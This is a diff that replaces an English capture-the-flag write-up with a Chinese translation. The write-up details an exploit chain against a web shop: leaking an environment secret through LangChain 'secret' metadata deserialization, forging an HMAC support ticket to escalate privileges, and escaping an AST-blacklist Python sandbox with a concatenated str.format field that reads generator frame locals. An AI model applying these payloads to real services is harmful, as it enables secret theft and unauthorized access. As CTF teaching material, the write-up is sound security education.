@@ -1,30 +1,30 @@
 # Web Shop Writeup
 
-## 0. Overall Exploit Chain
+## 0. 总体利用链
 
 ```text
-Register and log in
-  -> Knock the wooden fish 10 times to increase coins from 50 to 60
-  -> Buy the Support Debug Bundle
-  -> Download support_ticket.py
-  -> Learn SHOP_SUPPORT_SEED and the support ticket signing algorithm
-  -> Observe chat presence metadata and confirm that the backend uses LangChain serialization/deserialization
-  -> Construct LangChain metadata with type=secret
-  -> Write it through /api/chat/messages and read history through /api/chat/messages to trigger loads()
-  -> Leak SHOP_SUPPORT_SEED
-  -> Use the seed to issue today's support ticket for the current user
-  -> Call Bot /login to escalate privileges to support_admin
-  -> Call /api/rules/run
-  -> Use str.format field traversal to bypass the AST static blacklist
-  -> Read shipment_manifest from the generator frame locals
-  -> Obtain the flag
+注册登录
+  -> 敲木鱼 10 次，把 50 金币提升到 60 金币
+  -> 购买 Support Debug Bundle
+  -> 下载 support_ticket.py
+  -> 得知 SHOP_SUPPORT_SEED 和客服票据签发算法
+  -> 观察聊天 presence metadata，确认后端使用 LangChain 序列化/反序列化
+  -> 构造 type=secret 的 LangChain metadata
+  -> 通过 /api/chat/messages 写入并通过 /api/chat/messages 读取历史触发 loads()
+  -> 泄露 SHOP_SUPPORT_SEED
+  -> 用 seed 给当前用户签发当日 support ticket
+  -> 调用 Bot /login 提权为 support_admin
+  -> 调用 /api/rules/run
+  -> 利用 str.format field traversal 绕过 AST 静态黑名单
+  -> 读取 generator frame locals 中的 shipment_manifest
+  -> 得到 flag
 ```
 
 ---
 
-## 1. Register and Log In
+## 1. 注册登录
 
-Register a new account:
+注册一个新账号：
 
 ```http
 POST /api/auth/register
@@ -37,7 +37,7 @@ Content-Type: application/json
 }
 ```
 
-The response contains a token and user information:
+响应中得到 token 和用户信息：
 
 ```json
 {
@@ -52,7 +52,7 @@ The response contains a token and user information:
 }
 ```
 
-Include the following header in subsequent requests:
+后续请求带：
 
 ```http
 Authorization: Bearer <token>
@@ -60,22 +60,22 @@ Authorization: Bearer <token>
 
 ---
 
-## 2. Explore the Shop and Wooden Fish
+## 2. 探索商店和木鱼
 
-Query the products:
+查询商品：
 
 ```http
 GET /api/shop/products
 Authorization: Bearer <token>
 ```
 
-You can see a product priced at 60 coins:
+能看到一个价格为 60 金币的商品：
 
 ```text
 Support Debug Bundle
 ```
 
-A new user starts with 50 coins. The wooden fish endpoint can grant at most 10 extra coins:
+新用户初始金币为 50。木鱼接口最多可以额外获得 10 金币：
 
 ```http
 POST /api/woodfish/knock
@@ -85,7 +85,7 @@ Content-Type: application/json
 {}
 ```
 
-After calling it 10 times:
+调用 10 次后：
 
 ```text
 coins = 60
@@ -94,9 +94,9 @@ woodfishCount = 10
 
 ---
 
-## 3. Buy the Support Debug Bundle and Download the Script
+## 3. 购买 Support Debug Bundle 并下载脚本
 
-Buy the debug bundle priced at 60:
+购买价格为 60 的调试包：
 
 ```http
 POST /api/shop/buy
@@ -108,7 +108,7 @@ Content-Type: application/json
 }
 ```
 
-After a successful purchase, the response contains a download path:
+购买成功后响应中有下载路径：
 
 ```json
 {
@@ -116,14 +116,14 @@ After a successful purchase, the response contains a download path:
 }
 ```
 
-Download it:
+下载：
 
 ```http
 GET /api/shop/download/support-ticket
 Authorization: Bearer <token>
 ```
 
-This gives `support_ticket.py`. The core logic is:
+得到 `support_ticket.py`。核心逻辑：
 
 ```python
 SUPPORT_SEED_ENV = "SHOP_SUPPORT_SEED"
@@ -142,15 +142,15 @@ def verify_support_ticket(user: dict[str, Any], provided: str) -> bool:
     return secrets.compare_digest(provided, expected)
 ```
 
-From this, we know:
+可知：
 
-1. The environment variable that needs to be leaked is:
+1. 需要泄露的环境变量名是：
 
 ```text
 SHOP_SUPPORT_SEED
 ```
 
-2. The support admin login ticket algorithm is:
+2. support admin 登录票据算法为：
 
 ```text
 hmac_sha256(
@@ -161,9 +161,9 @@ hmac_sha256(
 
 ---
 
-## 4. Observe the Chat Presence Packet
+## 4. 观察聊天 presence 包
 
-After entering the chat page, the frontend periodically calls:
+进入聊天页面后，前端会定时调用：
 
 ```http
 POST /api/chat/presence
@@ -171,7 +171,7 @@ Authorization: Bearer <token>
 Content-Type: application/json
 ```
 
-The metadata is similar to:
+其中 metadata 类似：
 
 ```json
 {
@@ -194,7 +194,7 @@ The metadata is similar to:
 }
 ```
 
-The key format is:
+关键格式：
 
 ```json
 {
@@ -205,9 +205,9 @@ The key format is:
 }
 ```
 
-This is the format of a LangChain serialized object. The backend has serialization/restoration logic for chat metadata.
+这是 LangChain serialized object 的格式。后端对聊天 metadata 有序列化/恢复逻辑。
 
-LangChain also supports the `secret` type:
+LangChain 还支持 `secret` 类型：
 
 ```json
 {
@@ -217,15 +217,15 @@ LangChain also supports the `secret` type:
 }
 ```
 
-When `loads()` restores a secret, it attempts to read the value from environment variables.
+当 `loads()` 恢复 secret 时，会尝试从环境变量中取值。
 
 ---
 
-## 5. Leak SHOP_SUPPORT_SEED
+## 5. 泄露 SHOP_SUPPORT_SEED
 
-Normal chat messages store metadata in the database. When chat history is read, the backend restores historical metadata.
+普通聊天消息会将 metadata 存入数据库。读取历史聊天记录时，后端会恢复历史 metadata。
 
-Construct a message containing a `secret`:
+构造一条带 `secret` 的消息：
 
 ```http
 POST /api/chat/messages
@@ -245,14 +245,14 @@ Content-Type: application/json
 }
 ```
 
-Then read historical messages:
+然后读取历史消息：
 
 ```http
 GET /api/chat/messages
 Authorization: Bearer <token>
 ```
 
-In the response, the current user's own message will include the restored metadata:
+响应中当前用户自己的这条消息会带回恢复后的 metadata：
 
 ```json
 {
@@ -269,26 +269,26 @@ In the response, the current user's own message will include the restored metada
 }
 ```
 
-Record:
+记录：
 
 ```text
 SHOP_SUPPORT_SEED = <leaked seed>
 ```
 
-In the public environment, the chat history query only returns:
+公共环境中，聊天历史查询只返回：
 
 ```text
-System preset messages with user_id = 0
-The current user's own messages
+系统预置消息 user_id = 0
+当前用户自己的消息
 ```
 
-Therefore, you cannot directly see other players' payloads or leaked values.
+所以不能直接看到其他选手的 payload 或泄露值。
 
 ---
 
-## 6. Issue a Support Admin Login Ticket
+## 6. 签发 support admin 登录票据
 
-According to the algorithm in `support_ticket.py`, issue today's ticket for the current user:
+根据 `support_ticket.py` 算法，为当前用户签发当日 ticket：
 
 ```python
 import hashlib
@@ -305,13 +305,13 @@ ticket = hmac.new(seed.encode(), message.encode(), hashlib.sha256).hexdigest()[:
 print(ticket)
 ```
 
-Note that the date here uses the UTC date, not the local timezone date.
+注意这里日期使用 UTC 日期，不是本地时区日期。
 
 ---
 
-## 7. Log In as support_admin Through the Bot
+## 7. Bot 登录 support_admin
 
-Send the following to the Bot:
+向 Bot 发送：
 
 ```http
 POST /api/bot/chat
@@ -323,20 +323,20 @@ Content-Type: application/json
 }
 ```
 
-After success, the user's role in the response becomes:
+成功后响应中的用户 role 变为：
 
 ```text
 support_admin
 ```
 
-You can also confirm it with:
+也可以用：
 
 ```http
 GET /api/auth/me
 Authorization: Bearer <token>
 ```
 
-Confirmation:
+确认：
 
 ```json
 {
@@ -348,9 +348,9 @@ Confirmation:
 
 ---
 
-## 8. Enter Rule Lab
+## 8. 进入 Rule Lab
 
-After privilege escalation, you can call:
+提权后可调用：
 
 ```http
 POST /api/rules/run
@@ -362,7 +362,7 @@ Content-Type: application/json
 }
 ```
 
-Normal response:
+正常响应：
 
 ```json
 {
@@ -374,15 +374,15 @@ Normal response:
 
 ---
 
-## 9. Rule Lab Sandbox Analysis
+## 9. Rule Lab 沙箱分析
 
-Rule Lab exposes a business function:
+Rule Lab 暴露了业务函数：
 
 ```python
 iter_preview_items()
 ```
 
-Normal usage:
+正常用法：
 
 ```python
 items = []
@@ -391,14 +391,14 @@ for item in iter_preview_items():
 result = items
 ```
 
-The sandbox forbids many direct escape techniques, for example:
+沙箱会禁止很多直接逃逸写法，例如：
 
 ```python
 import os
 open("/app/private/flag.txt").read()
 ```
 
-It also forbids directly accessing the generator frame:
+也会禁止直接访问生成器 frame：
 
 ```python
 g = iter_preview_items()
@@ -406,14 +406,14 @@ next(g)
 result = g.gi_frame.f_locals
 ```
 
-This will be rejected:
+会被拒绝：
 
 ```text
 forbidden attribute: gi_frame
 forbidden attribute: f_locals
 ```
 
-The core sandbox logic contains a generator that is roughly equivalent to:
+沙箱核心逻辑中有一个生成器，大致等价于：
 
 ```python
 def iter_preview_items():
@@ -422,15 +422,15 @@ def iter_preview_items():
         yield item
 ```
 
-Here:
+其中：
 
 ```python
 shipment_manifest
 ```
 
-is the content of the private shipping preview file. In the deployment environment, this file is the flag.
+就是私有发货预览文件内容。部署环境中该文件是 flag。
 
-The sandbox uses an AST blacklist to detect sensitive fragments in attribute names and string constants:
+沙箱通过 AST 黑名单检测属性名和字符串常量中的敏感片段：
 
 ```text
 gi_frame
@@ -439,13 +439,13 @@ f_globals
 ...
 ```
 
-However, Python's `str.format()` field name performs attribute access and item access during formatting. The field string can be produced through string concatenation, thereby bypassing the AST static detection of the complete sensitive string.
+但是 Python 的 `str.format()` field name 会在格式化阶段执行属性访问和 item 访问。field 字符串可以通过字符串拼接产生，从而避开 AST 对完整敏感字符串的静态检测。
 
 ---
 
-## 10. Sandbox Escape Payload
+## 10. 沙箱逃逸 payload
 
-Submit the code:
+提交代码：
 
 ```python
 g = iter_preview_items()
@@ -454,7 +454,7 @@ field = "{0.gi_" + "frame.f_" + "locals[shipment_manifest]}"
 result = field.format(g)
 ```
 
-Corresponding request:
+对应请求：
 
 ```http
 POST /api/rules/run
@@ -466,32 +466,32 @@ Content-Type: application/json
 }
 ```
 
-Principle:
+原理：
 
-1. `g = iter_preview_items()` creates the generator.
-2. `next(g)` runs the generator until the first `yield`; at this point, `shipment_manifest` already exists in the generator frame locals.
-3. You cannot directly write `g.gi_frame.f_locals`, because the AST checks the attribute names and rejects them.
-4. Construct the format field:
+1. `g = iter_preview_items()` 创建生成器。
+2. `next(g)` 让生成器运行到第一个 `yield`，此时 `shipment_manifest` 已存在于生成器 frame locals 中。
+3. 不能直接写 `g.gi_frame.f_locals`，因为 AST 会检查属性名并拒绝。
+4. 构造 format field：
 
 ```python
 "{0.gi_" + "frame.f_" + "locals[shipment_manifest]}"
 ```
 
-After concatenation, it becomes:
+拼接后是：
 
 ```python
 "{0.gi_frame.f_locals[shipment_manifest]}"
 ```
 
-5. `field.format(g)` executes the following during format field parsing:
+5. `field.format(g)` 在 format field 解析阶段执行：
 
 ```python
 g.gi_frame.f_locals["shipment_manifest"]
 ```
 
-6. This retrieves the flag content.
+6. 得到 flag 内容。
 
-Successful response:
+成功响应：
 
 ```json
 {
